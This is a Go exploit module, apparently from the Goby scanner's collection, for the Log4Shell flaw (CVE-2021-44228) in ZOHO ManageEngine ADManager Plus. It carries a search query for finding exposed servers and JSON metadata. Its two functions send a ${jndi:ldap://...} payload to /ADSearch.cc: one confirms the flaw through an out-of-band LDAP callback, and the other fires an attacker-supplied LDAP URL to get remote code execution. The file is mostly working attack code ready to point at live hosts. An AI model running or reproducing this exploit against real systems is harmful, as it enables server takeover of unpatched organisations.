package exploits

import (
	"fmt"
	"git.gobies.org/goby/goscanner/godclient"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"time"
)

func init() {
	expJson := `{
    "Name": "ZOHO ManageEngine ADManager Plus ADSearch.cc log4j RCE Vulnerability (CVE-2021-44228)",
    "Description": "<p>ZOHO ManageEngine ADManager Plus is a set of Microsoft Active Directory management software designed for enterprise users using Windows domains from ZOHO.</p><p>ZOHO ManageEngine ADManager Plus uses a vulnerable version of the Apache log4j component, so there is CVE-2021-44228. Attackers can execute malicious commands to obtain server permissions.</p>",
    "Product": "ManageEngine-ADManager-Plus",
    "Homepage": "https://www.manageengine.com/products/ad-manager/",
    "DisclosureDate": "2023-01-17",
    "Author": "corp0ra1",
    "FofaQuery": "body=\"ADSearch.cc\" && (banner=\"JSESSIONIDADMP=\" || header=\"JSESSIONIDADMP=\")",
    "GobyQuery": "body=\"ADSearch.cc\" && (banner=\"JSESSIONIDADMP=\" || header=\"JSESSIONIDADMP=\")",
    "Level": "3",
    "Impact": "<p>ZOHO ManageEngine ADManager Plus uses a vulnerable version of the Apache log4j component, so there is CVE-2021-44228. Attackers can execute malicious commands to obtain server permissions.</p>",
    "Recommendation": "<p>At present, the manufacturer has released security patches, please pay attention to the official website update in time: <a href=\"https://www.manageengine.com/products/ad-manager/\">https://www.manageengine.com/products/ad-manager/</a></p>",
    "References": [],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "ldap",
            "type": "input",
            "value": "ldap://yourip",
            "show": ""
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "Code Execution",
        "2H1W"
    ],
    "VulType": [
        "Code Execution"
    ],
    "CVEIDs": [
        "CVE-2021-44228"
    ],
    "CNNVD": [
        "CNNVD-202112-799"
    ],
    "CNVD": [
        "CNVD-2021-100238"
    ],
    "CVSSScore": "9.8",
    "Translation": {
        "CN": {
            "Name": "ZOHO ManageEngine ADManager Plus 软件 ADSearch.cc 文件 log4j 远程代码执行漏洞（CVE-2021-44228）",
            "Product": "ManageEngine-ADManager-Plus",
            "Description": "<p>ZOHO ManageEngine ADManager Plus是美国卓豪（ZOHO）公司的一套为使用Windows域的企业用户设计的微软活动目录管理软件。<br></p><p>ZOHO ManageEngine ADManager Plus 由于使用了包含了漏洞版本的Apache log4j组件因此存在CVE-2021-44228，攻击者可执行恶意命令获取服务器权限。<br></p>",
            "Recommendation": "<p>目前厂商已发布安全补丁，请及时关注官网更新：<a href=\"https://www.manageengine.com/products/ad-manager/\">https://www.manageengine.com/products/ad-manager/</a><br></p>",
            "Impact": "<p>ZOHO ManageEngine ADManager Plus 由于使用了包含了漏洞版本的Apache log4j组件因此存在CVE-2021-44228，攻击者可执行恶意命令获取服务器权限。<br></p>",
            "VulType": [
                "代码执行"
            ],
            "Tags": [
                "代码执行",
                "两高一弱"
            ]
        },
        "EN": {
            "Name": "ZOHO ManageEngine ADManager Plus ADSearch.cc log4j RCE Vulnerability (CVE-2021-44228)",
            "Product": "ManageEngine-ADManager-Plus",
            "Description": "<p>ZOHO ManageEngine ADManager Plus is a set of Microsoft Active Directory management software designed for enterprise users using Windows domains from ZOHO.<br></p><p>ZOHO ManageEngine ADManager Plus uses a vulnerable version of the Apache log4j component, so there is CVE-2021-44228. Attackers can execute malicious commands to obtain server permissions.<br></p>",
            "Recommendation": "<p>At present, the manufacturer has released security patches, please pay attention to the official website update in time: <a href=\"https://www.manageengine.com/products/ad-manager/\">https://www.manageengine.com/products/ad-manager/</a><br></p>",
            "Impact": "<p>ZOHO ManageEngine ADManager Plus uses a vulnerable version of the Apache log4j component, so there is CVE-2021-44228. Attackers can execute malicious commands to obtain server permissions.<br></p>",
            "VulType": [
                "Code Execution"
            ],
            "Tags": [
                "Code Execution",
                "2H1W"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "9960"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			checkStr := goutils.RandomHexString(4)
			checkUrl, _ := godclient.GetGodLDAPCheckURL("U", checkStr)

			uri := fmt.Sprintf("/ADSearch.cc?methodToCall=${jndi:%s}", checkUrl)
			cfg := httpclient.NewGetRequestConfig(uri)
			cfg.VerifyTls = false
			cfg.FollowRedirect = false
			if _, err := httpclient.DoHttpRequest(u, cfg); err == nil {
				return godclient.PullExists(checkStr, time.Second*10)
			}

			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			cmd := ss.Params["ldap"].(string)
			uri := fmt.Sprintf("/ADSearch.cc?methodToCall=${jndi:%s}", cmd)
			cfg := httpclient.NewGetRequestConfig(uri)
			cfg.VerifyTls = false
			cfg.FollowRedirect = false
			if _, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg); err == nil {
				expResult.Output = "命令已执行"
				expResult.Success = true
			}
			return expResult
		},
	))
}